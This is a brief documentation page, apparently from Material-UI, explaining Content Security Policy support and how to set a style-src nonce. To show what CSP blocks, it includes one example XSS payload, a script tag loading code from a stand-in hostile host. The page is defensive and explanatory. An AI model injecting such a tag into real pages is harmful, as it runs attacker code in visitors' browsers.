# Content Security Policy

Starting in JSS version 9.6.0, Material-UI supports Content Security Policy headers.

## What is CSP and why is it useful?

Basically, CSP mitigates cross site scripting (XSS) attacks by requiring developers to whitelist the sources their assets are retrieved from. This list is returned as a header from the server. For instance, say you have a site hosted at `https://website.example` the csp header `default-src: 'self';` will allow all assets that are located at `https://website.example/*` and deny all others. If there is section of your website that is vunrible to XSS where unescaped user input is displayed, an attacker could input:

```
<script src="https://hostile.example/bad.js"></script>
```

Although, with a secure CSP header, the browser will not load this script.

You can read more about CSP [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

## How does one implement CSP?

In order to use CSP with Material-UI (and JSS), you need to set a `style-src` nonce in the meta tag like so:

```
<meta property="csp-nonce" content="longAndRandomStringGeneratedByServerUponEachRequest">
```

If you are new to CSP, this will probably not make much sense. [JSS has a great tutorial on how to achieve this.](https://github.com/cssinjs/jss/blob/master/docs/csp.md)
